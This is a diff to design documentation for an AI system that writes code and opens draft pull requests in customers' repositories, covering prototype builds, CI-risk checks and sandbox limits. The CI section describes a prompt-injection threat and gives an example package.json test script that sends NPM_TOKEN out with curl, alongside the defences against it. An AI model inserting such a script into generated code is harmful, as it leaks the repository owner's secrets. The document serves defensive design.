@@ -12,6 +12,14 @@ models of the council only review. Resume can still hand a failed task to anothe
 `deploy/hetzner/compose.yml`): tests are stored as "not run" with the note that they run in the repository's GitHub
 Actions once the draft PR is open; the PR view shows those checks. Self-hosted installations keep the Docker sandbox.
 
+## Prototype / measurement build (#249 part 2, 08.11.26)
+
+A run of kind `prototype` builds a proposal of a verdict that still needs verification, after a person approved a
+prototype / measurement build (`approve_prototype`). It exists to measure the requirements the council could not
+confirm, is marked in the builder prompt, the draft pull request (title prefix `[Prototype – not a finished solution]`
+and body), the audit and the execution screen, and is never a regular approval. Details: `docs/council-engine.md`,
+section "Favourite, prototype build and acceptance by measurement".
+
 ## Flow
 1. **Plan** – the author model of the approved proposal writes a plan: stack (`node` | `python`), install
    and test commands, 2–8 tasks with dependencies. The task graph is validated (unknown deps, duplicates, cycles).
@@ -41,6 +49,16 @@ review finding blocks publishing. An owner/admin may publish anyway only with a 
 which is written into the PR body and the audit log. Tests that could not run (no container runtime) and
 high-severity findings are warnings.
 
+**CI-relevant changes (#400).** The draft PR is pushed into the customer's own repository, where `pull_request`
+workflows run on it with the repository's secrets; generated code steered by a prompt injection could, for example,
+add `"test": "curl …?k=$NPM_TOKEN"`. `.github/` cannot be written at all; the other files a CI job executes are listed
+before publishing (`ciRisks` in `packages/build/src/ci-risk.ts`): changed `package.json` scripts, lockfiles, build/CI
+configuration and scripts (Makefile, Dockerfile, `*.config.*`, `pyproject.toml`, `scripts/` …), test setup
+(`conftest.py`, `vitest.setup.*` …) and tests that add a network call. Publishing needs an explicit confirmation
+(`confirmCiChanges: true`, checkbox in the UI), and the PR body lists them again. For repositories that receive such
+PRs, GitHub's "Require approval for all outside collaborators"/"workflow runs from bots" setting is a sensible second
+line of defence.
+
 The run's status is mirrored onto the session's Execution Council stage (running/completed/failed/cancelled), so
 the phase tabs reflect it. Draft PR titles use the first sentence of the plan summary, cut at a word boundary.
 
@@ -64,9 +82,10 @@ left and what will run again. Pending tasks behind a failed one are shown as "bl
 
 ## Known limits
 - Without a linked repository the workspace starts empty; with one it starts from a filtered snapshot of the default branch (docs/github-app.md).
-- Images are fixed (`node:22-alpine`, `python:3.12-alpine`). The install step has internet access; a dependency
-  could run install scripts inside the container. The container has no secrets and no host access, but network
-  egress during install is a residual risk (allow-listed registry proxy planned).
+- Images are fixed and pinned by digest (`node:22-alpine`, `python:3.12-alpine`, #399). The install step has internet access; a dependency
+  could run install scripts inside the container. The container has no secrets and no host access; since #399 the
+  install network cannot reach the host, private ranges or the metadata service (docs/hetzner.md). Egress to the
+  public internet during install remains a residual risk (allow-listed registry proxy planned).
 - Docker on the worker host is required for real test runs; rootless Docker or gVisor is recommended in production.
 
 ## Status shown in the session and on the dashboard (#91)
